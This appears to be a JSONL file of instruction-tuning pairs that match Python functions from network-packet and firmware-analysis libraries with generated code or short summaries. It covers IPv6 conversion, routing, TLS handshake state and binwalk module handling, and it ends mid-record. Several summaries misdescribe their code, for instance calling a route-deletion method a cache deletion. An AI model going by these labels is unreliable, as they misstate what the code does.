{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngetting representation name of a pnio frame ID.", "response": "def i2s_frameid(x):\n    \"\"\" Get representation name of a pnio frame ID\n\n    :param x: a key of the PNIO_FRAME_IDS dictionary\n    :returns: str\n    \"\"\"\n    try:\n        return PNIO_FRAME_IDS[x]\n    except KeyError:\n        pass\n    if 0x0100 <= x < 0x1000:\n        return \"RT_CLASS_3 (%4x)\" % x\n    if 0x8000 <= x < 0xC000:\n        return \"RT_CLASS_1 (%4x)\" % x\n    if 0xC000 <= x < 0xFC00:\n        return \"RT_CLASS_UDP (%4x)\" % x\n    if 0xFF80 <= x < 0xFF90:\n        return \"FragmentationFrameID (%4x)\" % x\n    return x"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef s2i_frameid(x):\n    try:\n        return {\n            \"RT_CLASS_3\": 0x0100,\n            \"RT_CLASS_1\": 0x8000,\n            \"RT_CLASS_UDP\": 0xC000,\n            \"FragmentationFrameID\": 0xFF80,\n        }[x]\n    except KeyError:\n        pass\n    try:\n        return next(key for key, value in six.iteritems(PNIO_FRAME_IDS)\n                    if value == x)\n    except StopIteration:\n        pass\n    return x", "response": "Get pnio frame ID from a representation name"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef dispatch_hook(cls, _pkt=None, *args, **kargs):\n        '''\n          Attribution of correct type depending on version and pdu_type\n        '''\n        if _pkt and len(_pkt) >= 2:\n            version = orb(_pkt[0])\n            pdu_type = orb(_pkt[1])\n            if version == 0:\n                return PDU_CLASS_VERSION_0[pdu_type]\n            elif version == 1:\n                return PDU_CLASS_VERSION_1[pdu_type]\n        return Raw", "response": "This method is used to dispatch the event from the backend to the appropriate handler."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef parse(self, data):\n\n        ASNlist = []\n        for line in data.splitlines()[1:]:\n            line = plain_str(line)\n            if \"|\" not in line:\n                continue\n            asn, ip, desc = [elt.strip() for elt in line.split('|')]\n            if asn == \"NA\":\n                continue\n            asn = \"AS%s\" % asn\n            ASNlist.append((ip, asn, desc))\n        return ASNlist", "response": "Parse bulk cymru data"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nencodes the mrcode value to its IGMPv3 encoded time value if needed.", "response": "def encode_maxrespcode(self):\n        \"\"\"Encode and replace the mrcode value to its IGMPv3 encoded time value if needed,  # noqa: E501\n        as specified in rfc3376#section-4.1.1.\n\n        If value < 128, return the value specified. If >= 128, encode as a floating  # noqa: E501\n        point value. Value can be 0 - 31744.\n        \"\"\"\n        value = self.mrcode\n        if value < 128:\n            code = value\n        elif value > 31743:\n            code = 255\n        else:\n            exp = 0\n            value >>= 3\n            while(value > 31):\n                exp += 1\n                value >>= 1\n            exp <<= 4\n            code = 0x80 | exp | (value & 0x0F)\n        self.mrcode = code"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _register_lltd_specific_class(*attr_types):\n    def _register(cls):\n        for attr_type in attr_types:\n            SPECIFIC_CLASSES[attr_type] = cls\n        type_fld = LLTDAttribute.fields_desc[0].copy()\n        type_fld.default = attr_types[0]\n        cls.fields_desc = [type_fld] + cls.fields_desc\n        return cls\n    return _register", "response": "This is a class decorator that registers LLTDAttributeSpecific with the given list of attr_types."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nupdate the builder using the provided plist. plist can be either a Packet or PacketList.", "response": "def parse(self, plist):\n        \"\"\"Update the builder using the provided `plist`. `plist` can\n        be either a Packet() or a PacketList().\n\n        \"\"\"\n        if not isinstance(plist, PacketList):\n            plist = PacketList(plist)\n        for pkt in plist[LLTD]:\n            if LLTDQueryLargeTlv in pkt:\n                key = \"%s:%s:%d\" % (pkt.real_dst, pkt.real_src, pkt.seq)\n                self.types_offsets[key] = (pkt[LLTDQueryLargeTlv].type,\n                                           pkt[LLTDQueryLargeTlv].offset)\n            elif LLTDQueryLargeTlvResp in pkt:\n                try:\n                    key = \"%s:%s:%d\" % (pkt.real_src, pkt.real_dst, pkt.seq)\n                    content, offset = self.types_offsets[key]\n                except KeyError:\n                    continue\n                loc = slice(offset, offset + pkt[LLTDQueryLargeTlvResp].len)\n                key = \"%s > %s [%s]\" % (\n                    pkt.real_src, pkt.real_dst,\n                    LLTDQueryLargeTlv.fields_desc[0].i2s.get(content, content),\n                )\n                data = self.data.setdefault(key, array(\"B\"))\n                datalen = len(data)\n                if datalen < loc.stop:\n                    data.extend(array(\"B\", b\"\\x00\" * (loc.stop - datalen)))\n                data[loc] = array(\"B\", pkt[LLTDQueryLargeTlvResp].value)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn a dictionary object containing the content type and the content type of the content.", "response": "def get_data(self):\n        \"\"\"Returns a dictionary object, keys are strings \"source >\n        destincation [content type]\", and values are the content\n        fetched, also as a string.\n\n        \"\"\"\n        return {key: \"\".join(chr(byte) for byte in data)\n                for key, data in six.iteritems(self.data)}"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nconverts an IPv6 address from text representation into binary form.", "response": "def _inet6_pton(addr):\n    \"\"\"Convert an IPv6 address from text representation into binary form,\nused when socket.inet_pton is not available.\n\n    \"\"\"\n    joker_pos = None\n    result = b\"\"\n    addr = plain_str(addr)\n    if addr == '::':\n        return b'\\x00' * 16\n    if addr.startswith('::'):\n        addr = addr[1:]\n    if addr.endswith('::'):\n        addr = addr[:-1]\n    parts = addr.split(\":\")\n    nparts = len(parts)\n    for i, part in enumerate(parts):\n        if not part:\n            # \"::\" indicates one or more groups of 2 null bytes\n            if joker_pos is None:\n                joker_pos = len(result)\n            else:\n                # Wildcard is only allowed once\n                raise _INET6_PTON_EXC\n        elif i + 1 == nparts and '.' in part:\n            # The last part of an IPv6 address can be an IPv4 address\n            if part.count('.') != 3:\n                # we have to do this since socket.inet_aton('1.2') ==\n                # b'\\x01\\x00\\x00\\x02'\n                raise _INET6_PTON_EXC\n            try:\n                result += socket.inet_aton(part)\n            except socket.error:\n                raise _INET6_PTON_EXC\n        else:\n            # Each part must be 16bit. Add missing zeroes before decoding.\n            try:\n                result += hex_bytes(part.rjust(4, \"0\"))\n            except (binascii.Error, TypeError):\n                raise _INET6_PTON_EXC\n    # If there's a wildcard, fill up with zeros to reach 128bit (16 bytes)\n    if joker_pos is not None:\n        if len(result) == 16:\n            raise _INET6_PTON_EXC\n        result = (result[:joker_pos] + b\"\\x00\" * (16 - len(result)) +\n                  result[joker_pos:])\n    if len(result) != 16:\n        raise _INET6_PTON_EXC\n    return result"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nconverts an IP address from text representation into binary form.", "response": "def inet_pton(af, addr):\n    \"\"\"Convert an IP address from text representation into binary form.\"\"\"\n    # Will replace Net/Net6 objects\n    addr = plain_str(addr)\n    # Use inet_pton if available\n    try:\n        return socket.inet_pton(af, addr)\n    except AttributeError:\n        try:\n            return _INET_PTON[af](addr)\n        except KeyError:\n            raise socket.error(\"Address family not supported by protocol\")"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _inet6_ntop(addr):\n    # IPv6 addresses have 128bits (16 bytes)\n    if len(addr) != 16:\n        raise ValueError(\"invalid length of packed IP address string\")\n\n    # Decode to hex representation\n    address = \":\".join(plain_str(bytes_hex(addr[idx:idx + 2])).lstrip('0') or '0'  # noqa: E501\n                       for idx in range(0, 16, 2))\n\n    try:\n        # Get the longest set of zero blocks. We need to take a look\n        # at group 1 regarding the length, as 0:0:1:0:0:2:3:4 would\n        # have two matches: 0:0: and :0:0: where the latter is longer,\n        # though the first one should be taken. Group 1 is in both\n        # cases 0:0.\n        match = max(_IP6_ZEROS.finditer(address),\n                    key=lambda m: m.end(1) - m.start(1))\n        return '{}::{}'.format(address[:match.start()], address[match.end():])\n    except ValueError:\n        return address", "response": "Convert an IPv6 address from binary form into text representation."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nconvert an IP address from binary form into text representation.", "response": "def inet_ntop(af, addr):\n    \"\"\"Convert an IP address from binary form into text representation.\"\"\"\n    # Use inet_ntop if available\n    addr = bytes_encode(addr)\n    try:\n        return socket.inet_ntop(af, addr)\n    except AttributeError:\n        try:\n            return _INET_NTOP[af](addr)\n        except KeyError:\n            raise ValueError(\"unknown address family %d\" % af)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef recv_raw(self, x=MTU):\n        ll = self.ins.datalink()\n        if ll in conf.l2types:\n            cls = conf.l2types[ll]\n        else:\n            cls = conf.default_l2\n            warning(\"Unable to guess datalink type (interface=%s linktype=%i). Using %s\",  # noqa: E501\n                    self.iface, ll, cls.name)\n\n        pkt = None\n        while pkt is None:\n            pkt = self.ins.next()\n            if pkt is not None:\n                ts, pkt = pkt\n            if pkt is None and scapy.consts.WINDOWS:\n                raise TimeoutElapsed  # To understand this behavior, have a look at L2pcapListenSocket's note  # noqa: E501\n            if pkt is None:\n                return None, None, None\n        return cls, pkt, ts", "response": "Receives a packet then returns a tuple containing cls pkt_data time"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef nonblock_recv(self):\n        self.ins.setnonblock(1)\n        p = self.recv(MTU)\n        self.ins.setnonblock(0)\n        return p", "response": "Receives and dissects a packet in non - blocking mode."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef delt(self, *args, **kargs):\n        self.invalidate_cache()\n        route = self.make_route(*args, **kargs)\n        try:\n            i = self.routes.index(route)\n            del(self.routes[i])\n        except ValueError:\n            warning(\"no matching route found\")", "response": "delt - Delete a single entry from the cache"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning the IPv4 routes to a destination host.", "response": "def route(self, dst=None, verbose=conf.verb):\n        \"\"\"Returns the IPv4 routes to a host.\n        parameters:\n         - dst: the IPv4 of the destination host\n\n        returns: (iface, output_ip, gateway_ip)\n         - iface: the interface used to connect to the host\n         - output_ip: the outgoing IP that will be used\n         - gateway_ip: the gateway IP that will be used\n        \"\"\"\n        dst = dst or \"0.0.0.0\"  # Enable route(None) to return default route\n        if isinstance(dst, bytes):\n            try:\n                dst = plain_str(dst)\n            except UnicodeDecodeError:\n                raise TypeError(\"Unknown IP address input (bytes)\")\n        if dst in self.cache:\n            return self.cache[dst]\n        # Transform \"192.168.*.1-5\" to one IP of the set\n        _dst = dst.split(\"/\")[0].replace(\"*\", \"0\")\n        while True:\n            idx = _dst.find(\"-\")\n            if idx < 0:\n                break\n            m = (_dst[idx:] + \".\").find(\".\")\n            _dst = _dst[:idx] + _dst[idx + m:]\n\n        atol_dst = atol(_dst)\n        paths = []\n        for d, m, gw, i, a, me in self.routes:\n            if not a:  # some interfaces may not currently be connected\n                continue\n            aa = atol(a)\n            if aa == atol_dst:\n                paths.append(\n                    (0xffffffff, 1, (scapy.consts.LOOPBACK_INTERFACE, a, \"0.0.0.0\"))  # noqa: E501\n                )\n            if (atol_dst & m) == (d & m):\n                paths.append((m, me, (i, a, gw)))\n\n        if not paths:\n            if verbose:\n                warning(\"No route found (no default route?)\")\n            return scapy.consts.LOOPBACK_INTERFACE, \"0.0.0.0\", \"0.0.0.0\"\n        # Choose the more specific route\n        # Sort by greatest netmask and use metrics as a tie-breaker\n        paths.sort(key=lambda x: (-x[0], x[1]))\n        # Return interface\n        ret = paths[0][2]\n        self.cache[dst] = ret\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nupdate the internal state of the TLS session.", "response": "def tls_session_update(self, msg_str):\n        \"\"\"\n        Either for parsing or building, we store the client_random\n        along with the raw string representing this handshake message.\n        \"\"\"\n        super(TLSClientHello, self).tls_session_update(msg_str)\n\n        self.tls_session.advertised_tls_version = self.version\n        self.random_bytes = msg_str[10:38]\n        self.tls_session.client_random = (struct.pack('!I',\n                                                      self.gmt_unix_time) +\n                                          self.random_bytes)\n        if self.ext:\n            for e in self.ext:\n                if isinstance(e, TLS_Ext_SupportedVersions):\n                    if self.tls_session.tls13_early_secret is None:\n                        # this is not recomputed if there was a TLS 1.3 HRR\n                        self.tls_session.compute_tls13_early_secrets()\n                    break"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nupdating the TLS session with the message string.", "response": "def tls_session_update(self, msg_str):\n        \"\"\"\n        Either for parsing or building, we store the server_random along with\n        the raw string representing this handshake message. We also store the\n        cipher suite (if recognized), and finally we instantiate the write and\n        read connection states.\n        \"\"\"\n        super(TLSClientHello, self).tls_session_update(msg_str)\n\n        s = self.tls_session\n        s.tls_version = self.version\n        s.server_random = self.random_bytes\n\n        cs_cls = None\n        if self.cipher:\n            cs_val = self.cipher\n            if cs_val not in _tls_cipher_suites_cls:\n                warning(\"Unknown cipher suite %d from ServerHello\" % cs_val)\n                # we do not try to set a default nor stop the execution\n            else:\n                cs_cls = _tls_cipher_suites_cls[cs_val]\n\n        connection_end = s.connection_end\n        s.pwcs = writeConnState(ciphersuite=cs_cls,\n                                connection_end=connection_end,\n                                tls_version=self.version)\n        s.triggered_pwcs_commit = True\n        s.prcs = readConnState(ciphersuite=cs_cls,\n                               connection_end=connection_end,\n                               tls_version=self.version)\n        s.triggered_prcs_commit = True\n\n        if self.tls_session.tls13_early_secret is None:\n            # In case the connState was not pre-initialized, we could not\n            # compute the early secrets at the ClientHello, so we do it here.\n            self.tls_session.compute_tls13_early_secrets()\n        s.compute_tls13_handshake_secrets()"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nbuilding the message with the appropriate parameters.", "response": "def build(self, *args, **kargs):\n        \"\"\"\n        We overload build() method in order to provide a valid default value\n        for params based on TLS session if not provided. This cannot be done by\n        overriding i2m() because the method is called on a copy of the packet.\n\n        The 'params' field is built according to key_exchange.server_kx_msg_cls\n        which should have been set after receiving a cipher suite in a\n        previous ServerHello. Usual cases are:\n        - None: for RSA encryption or fixed FF/ECDH. This should never happen,\n          as no ServerKeyExchange should be generated in the first place.\n        - ServerDHParams: for ephemeral FFDH. In that case, the parameter to\n          server_kx_msg_cls does not matter.\n        - ServerECDH*Params: for ephemeral ECDH. There are actually three\n          classes, which are dispatched by _tls_server_ecdh_cls_guess on\n          the first byte retrieved. The default here is b\"\\03\", which\n          corresponds to ServerECDHNamedCurveParams (implicit curves).\n\n        When the Server*DHParams are built via .fill_missing(), the session\n        server_kx_privkey will be updated accordingly.\n        \"\"\"\n        fval = self.getfieldval(\"params\")\n        if fval is None:\n            s = self.tls_session\n            if s.pwcs:\n                if s.pwcs.key_exchange.export:\n                    cls = ServerRSAParams(tls_session=s)\n                else:\n                    cls = s.pwcs.key_exchange.server_kx_msg_cls(b\"\\x03\")\n                    cls = cls(tls_session=s)\n                try:\n                    cls.fill_missing()\n                except Exception:\n                    if conf.debug_dissector:\n                        raise\n                    pass\n            else:\n                cls = Raw()\n            self.params = cls\n\n        fval = self.getfieldval(\"sig\")\n        if fval is None:\n            s = self.tls_session\n            if s.pwcs:\n                if not s.pwcs.key_exchange.anonymous:\n                    p = self.params\n                    if p is None:\n                        p = b\"\"\n                    m = s.client_random + s.server_random + raw(p)\n                    cls = _TLSSignature(tls_session=s)\n                    cls._update_sig(m, s.server_key)\n                else:\n                    cls = Raw()\n            else:\n                cls = Raw()\n            self.sig = cls\n\n        return _TLSHandshake.build(self, *args, **kargs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nchecks if the server_kx_pubkey is valid and verify the server_kx_pubkey.", "response": "def post_dissection(self, pkt):\n        \"\"\"\n        While previously dissecting Server*DHParams, the session\n        server_kx_pubkey should have been updated.\n\n        XXX Add a 'fixed_dh' OR condition to the 'anonymous' test.\n        \"\"\"\n        s = self.tls_session\n        if s.prcs and s.prcs.key_exchange.no_ske:\n            pkt_info = pkt.firstlayer().summary()\n            log_runtime.info(\"TLS: useless ServerKeyExchange [%s]\", pkt_info)\n        if (s.prcs and\n            not s.prcs.key_exchange.anonymous and\n            s.client_random and s.server_random and\n                s.server_certs and len(s.server_certs) > 0):\n            m = s.client_random + s.server_random + raw(self.params)\n            sig_test = self.sig._verify_sig(m, s.server_certs[0])\n            if not sig_test:\n                pkt_info = pkt.firstlayer().summary()\n                log_runtime.info(\"TLS: invalid ServerKeyExchange signature [%s]\", pkt_info)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef m2i(self, pkt, m):\n        tmp_len = self.length_from(pkt)\n        tbd, rem = m[:tmp_len], m[tmp_len:]\n\n        s = pkt.tls_session\n        cls = None\n\n        if s.prcs and s.prcs.key_exchange:\n            cls = s.prcs.key_exchange.client_kx_msg_cls\n\n        if cls is None:\n            return Raw(tbd) / Padding(rem)\n\n        return cls(tbd, tls_session=s) / Padding(rem)", "response": "Convert a client_kx_msg to an internal representation."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef nmap_fp(target, oport=80, cport=81):\n    sigs = nmap_sig(target, oport, cport)\n    return nmap_search(sigs)", "response": "nmap fingerprinting\nnmap_fp - return a list of best guesses with accuracy\n"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef process_kwargs(obj, kwargs):\n    '''\n    Convenience wrapper around binwalk.core.module.Modules.kwargs.\n\n    @obj    - The class object (an instance of a sub-class of binwalk.core.module.Module).\n    @kwargs - The kwargs provided to the object's __init__ method.\n\n    Returns None.\n    '''\n    with Modules() as m:\n        kwargs = m.kwargs(obj, kwargs)\n    return kwargs", "response": "Wrapper around binwalk. core. module. Modules. kwargs.\n   "}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef show_help(fd=sys.stdout):\n    '''\n    Convenience wrapper around binwalk.core.module.Modules.help.\n\n    @fd - An object with a write method (e.g., sys.stdout, sys.stderr, etc).\n\n    Returns None.\n    '''\n    with Modules() as m:\n        fd.write(m.help())", "response": "A convenience wrapper around binwalk. core. module. Modules. help. show_help"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ngetting the next file to be scanned.", "response": "def next_file(self, close_previous=True):\n        '''\n        Gets the next file to be scanned (including pending extracted files, if applicable).\n        Also re/initializes self.status.\n        All modules should access the target file list through this method.\n        '''\n        fp = None\n\n        # Ensure files are close to prevent IOError (too many open files)\n        if close_previous:\n            try:\n                self.previous_next_file_fp.close()\n            except KeyboardInterrupt as e:\n                raise e\n            except Exception:\n                pass\n\n        # Add any pending extracted files to the target_files list and reset\n        # the extractor's pending file list\n        self.target_file_list += self.extractor.pending\n\n        # Reset all dependencies prior to continuing with another file.\n        # This is particularly important for the extractor module, which must be reset\n        # in order to reset its base output directory path for each file, and the\n        # list of pending files.\n        self.reset_dependencies()\n\n        while self.target_file_list:\n            next_target_file = self.target_file_list.pop(0)\n\n            # Values in self.target_file_list are either already open files (BlockFile instances), or paths\n            # to files that need to be opened for scanning.\n            if isinstance(next_target_file, str):\n                fp = self.config.open_file(next_target_file)\n            else:\n                fp = next_target_file\n\n            if not fp:\n                break\n            else:\n                if (self.config.file_name_filter(fp) == False or\n                        self._plugins_load_file(fp) == False):\n                    fp.close()\n                    fp = None\n                    continue\n                else:\n                    self.status.clear()\n                    self.status.total = fp.length\n                    break\n\n        if fp is not None:\n            self.current_target_file_name = fp.path\n            self.status.fp = fp\n        else:\n            self.current_target_file_name = None\n            self.status.fp = None\n\n        self.previous_next_file_fp = fp\n\n        self._plugins_new_file(fp)\n\n        return fp"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nclears the results and errors lists.", "response": "def clear(self, results=True, errors=True):\n        '''\n        Clears results and errors lists.\n        '''\n        if results:\n            self.results = []\n        if errors:\n            self.errors = []"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef result(self, r=None, **kwargs):\n        '''\n        Validates a result, stores it in self.results and prints it.\n        Accepts the same kwargs as the binwalk.core.module.Result class.\n\n        @r - An existing instance of binwalk.core.module.Result.\n\n        Returns an instance of binwalk.core.module.Result.\n        '''\n        if r is None:\n            r = Result(**kwargs)\n\n        # Add the name of the current module to the result\n        r.module = self.__class__.__name__\n\n        # Any module that is reporting results, valid or not, should be marked\n        # as enabled\n        if not self.enabled:\n            self.enabled = True\n\n        self.validate(r)\n        self._plugins_result(r)\n\n        # Update the progress status automatically if it is not being done\n        # manually by the module\n        if r.offset and r.file and self.AUTO_UPDATE_STATUS:\n            self.status.total = r.file.length\n            self.status.completed = r.offset\n            self.status.fp = r.file\n\n        for dependency in self.dependencies:\n            try:\n                getattr(self, dependency.attribute).callback(r)\n            except AttributeError:\n                continue\n\n        if r.valid:\n            self.results.append(r)\n\n            if r.display:\n                display_args = self._build_display_args(r)\n                if display_args:\n                    self.config.display.format_strings(self.HEADER_FORMAT, self.RESULT_FORMAT)\n                    self.config.display.result(*display_args)\n\n        return r", "response": "Validates a result stores it in self. results and prints it."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nstore the specified error in self. errors. A new error is created and the specified kwargs are passed to the Error class.", "response": "def error(self, **kwargs):\n        '''\n        Stores the specified error in self.errors.\n\n        Accepts the same kwargs as the binwalk.core.module.Error class.\n\n        Returns None.\n        '''\n        exception_header_width = 100\n\n        e = Error(**kwargs)\n        e.module = self.__class__.__name__\n\n        self.errors.append(e)\n\n        if e.exception:\n            sys.stderr.write(\"\\n\" + e.module + \" Exception: \" + str(e.exception) + \"\\n\")\n            sys.stderr.write(\"-\" * exception_header_width + \"\\n\")\n            traceback.print_exc(file=sys.stderr)\n            sys.stderr.write(\"-\" * exception_header_width + \"\\n\\n\")\n        elif e.description:\n            sys.stderr.write(\"\\n\" + e.module + \" Error: \" + e.description + \"\\n\\n\")"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef header(self):\n        '''\n        Displays the scan header, as defined by self.HEADER and self.HEADER_FORMAT.\n\n        Returns None.\n        '''\n        self.config.display.format_strings(self.HEADER_FORMAT, self.RESULT_FORMAT)\n        self.config.display.add_custom_header(self.VERBOSE_FORMAT, self.VERBOSE)\n\n        if type(self.HEADER) == type([]):\n            self.config.display.header(*self.HEADER, file_name=self.current_target_file_name)\n        elif self.HEADER:\n            self.config.display.header(self.HEADER, file_name=self.current_target_file_name)", "response": "Displays the scan header as defined by self. HEADER and self. HEADER_FORMAT.\n        Returns None."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef main(self):\n        '''\n        Responsible for calling self.init, initializing self.config.display, and calling self.run.\n\n        Returns the value returned from self.run.\n        '''\n        self.status = self.parent.status\n        self.modules = self.parent.executed_modules\n\n        # A special exception for the extractor module, which should be allowed to\n        # override the verbose setting, e.g., if --matryoshka has been\n        # specified\n        if hasattr(self, \"extractor\") and self.extractor.config.verbose:\n            self.config.verbose = self.config.display.verbose = True\n\n        if not self.config.files:\n            binwalk.core.common.debug(\"No target files specified, module %s terminated\" % self.name)\n            return False\n\n        self.reset_dependencies()\n\n        try:\n            self.init()\n        except KeyboardInterrupt as e:\n            raise e\n        except Exception as e:\n            self.error(exception=e)\n            return False\n\n        try:\n            self.config.display.format_strings(self.HEADER_FORMAT, self.RESULT_FORMAT)\n        except KeyboardInterrupt as e:\n            raise e\n        except Exception as e:\n            self.error(exception=e)\n            return False\n\n        self._plugins_pre_scan()\n\n        try:\n            retval = self.run()\n        except KeyboardInterrupt as e:\n            raise e\n        except Exception as e:\n            self.error(exception=e)\n            return False\n\n        self._plugins_post_scan()\n\n        return retval", "response": "Main entry point for the base class."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef list(self, attribute=\"run\"):\n        '''\n        Finds all modules with the specified attribute.\n\n        @attribute - The desired module attribute.\n\n        Returns a list of modules that contain the specified attribute, in the order they should be executed.\n        '''\n        import binwalk.modules\n        modules = {}\n\n        for (name, module) in inspect.getmembers(binwalk.modules):\n            if inspect.isclass(module) and hasattr(module, attribute):\n                modules[module] = module.PRIORITY\n\n        # user-defined modules\n        import imp\n        user_modules = binwalk.core.settings.Settings().user.modules\n        for file_name in os.listdir(user_modules):\n            if not file_name.endswith('.py'):\n                continue\n            module_name = file_name[:-3]\n            try:\n                user_module = imp.load_source(module_name, os.path.join(user_modules, file_name))\n            except KeyboardInterrupt as e:\n                raise e\n            except Exception as e:\n                binwalk.core.common.warning(\"Error loading module '%s': %s\" % (file_name, str(e)))\n\n            for (name, module) in inspect.getmembers(user_module):\n                if inspect.isclass(module) and hasattr(module, attribute):\n                    modules[module] = module.PRIORITY\n\n        return sorted(modules, key=modules.get, reverse=True)", "response": "Returns a list of modules that contain the specified attribute."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef help(self):\n        '''\n        Generates formatted help output.\n\n        Returns the help string.\n        '''\n        modules = {}\n        help_string = \"\\n\"\n        help_string += \"Binwalk v%s\\n\" % binwalk.__version__\n        help_string += \"Craig Heffner, ReFirmLabs\\n\"\n        help_string += \"https://github.com/ReFirmLabs/binwalk\\n\"\n        help_string += \"\\n\"\n        help_string += \"Usage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ...\\n\"\n\n        # Build a dictionary of modules and their ORDER attributes.\n        # This makes it easy to sort modules by their ORDER attribute for\n        # display.\n        for module in self.list(attribute=\"CLI\"):\n            if module.CLI:\n                modules[module] = module.ORDER\n\n        for module in sorted(modules, key=modules.get, reverse=True):\n            help_string += \"\\n%s Options:\\n\" % module.TITLE\n\n            for module_option in module.CLI:\n                if module_option.long and not module_option.hidden:\n                    long_opt = '--' + module_option.long\n\n                    if module_option.dtype:\n                        optargs = \"=<%s>\" % module_option.dtype\n                    else:\n                        optargs = \"\"\n\n                    if module_option.short:\n                        short_opt = \"-\" + module_option.short + \",\"\n                    else:\n                        short_opt = \"   \"\n\n                    fmt = \"    %%s %%s%%-%ds%%s\\n\" % (25 - len(long_opt))\n                    help_string += fmt % (short_opt, long_opt, optargs, module_option.description)\n\n        return help_string + \"\\n\"", "response": "Generates formatted help output."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef execute(self, *args, **kwargs):\n        '''\n        Executes all appropriate modules according to the options specified in args/kwargs.\n\n        Returns a list of executed module objects.\n        '''\n        run_modules = []\n        orig_arguments = self.arguments\n\n        if args or kwargs:\n            self._set_arguments(list(args), kwargs)\n\n        # Run all modules\n        for module in self.list():\n            obj = self.run(module)\n\n        # Add all loaded modules that marked themselves as enabled to the\n        # run_modules list\n        for (module, obj) in iterator(self.executed_modules):\n            # Report the results if the module is enabled and if it is a\n            # primary module or if it reported any results/errors\n            if obj.enabled and (obj.PRIMARY or obj.results or obj.errors):\n                run_modules.append(obj)\n\n        self.arguments = orig_arguments\n\n        return run_modules", "response": "Executes all appropriate modules according to the options specified in args or kwargs. Returns a list of module objects that were executed."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nruns a specific module.", "response": "def run(self, module, dependency=False, kwargs={}):\n        '''\n        Runs a specific module.\n        '''\n        try:\n            obj = self.load(module, kwargs)\n\n            if isinstance(obj, binwalk.core.module.Module) and obj.enabled:\n                obj.main()\n                self.status.clear()\n\n            # If the module is not being loaded as a dependency, add it to the executed modules dictionary.\n            # This is used later in self.execute to determine which objects\n            # should be returned.\n            if not dependency:\n                self.executed_modules[module] = obj\n\n                # The unload method tells the module that we're done with it, and gives it a chance to do\n                # any cleanup operations that may be necessary. We still retain\n                # the object instance in self.executed_modules.\n                obj._unload_dependencies()\n                obj.unload()\n        except KeyboardInterrupt as e:\n            # Tell the status server to shut down, and give it time to clean\n            # up.\n            if self.status.running:\n                self.status.shutdown = True\n                while not self.status.finished:\n                    time.sleep(0.1)\n            raise e\n\n        return obj"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nprocessing the command line arguments for any specific module.", "response": "def argv(self, module, argv=sys.argv[1:]):\n        '''\n        Processes argv for any options specific to the specified module.\n\n        @module - The module to process argv for.\n        @argv   - A list of command line arguments (excluding argv[0]).\n\n        Returns a dictionary of kwargs for the specified module.\n        '''\n        kwargs = {'enabled': False}\n        last_priority = {}\n        parser = argparse.ArgumentParser(add_help=False)\n        # Hack: This allows the ListActionParser class to correllate short options to long options.\n        # There is probably a built-in way to do this in the\n        # argparse.ArgumentParser class?\n        parser.short_to_long = {}\n\n        # Must build arguments from all modules so that:\n        #\n        #    1) Any conflicting arguments will raise an exception\n        #    2) The only unknown arguments will be the target files, making them\n        #       easy to identify\n        for m in self.list(attribute=\"CLI\"):\n\n            for module_option in m.CLI:\n\n                parser_args = []\n                parser_kwargs = {}\n\n                if not module_option.long:\n                    continue\n\n                if module_option.short:\n                    parser_args.append('-' + module_option.short)\n                parser_args.append('--' + module_option.long)\n                parser_kwargs['dest'] = module_option.long\n\n                if module_option.type is None:\n                    parser_kwargs['action'] = 'store_true'\n                elif module_option.type is list:\n                    parser_kwargs['action'] = 'append'\n                    parser.short_to_long[\n                        module_option.short] = module_option.long\n\n                parser.add_argument(*parser_args, **parser_kwargs)\n\n        args, unknown = parser.parse_known_args(argv)\n        args = args.__dict__\n\n        # Only add parsed options pertinent to the requested module\n        for module_option in module.CLI:\n\n            if module_option.type == binwalk.core.common.BlockFile:\n\n                for k in get_keys(module_option.kwargs):\n                    kwargs[k] = []\n                    for unk in unknown:\n                        kwargs[k].append(unk)\n\n            elif has_key(args, module_option.long) and args[module_option.long] not in [None, False]:\n\n                # Loop through all the kwargs for this command line option\n                for (name, default_value) in iterator(module_option.kwargs):\n\n                    # If this kwarg has not been previously processed, or if its priority is equal to or\n                    # 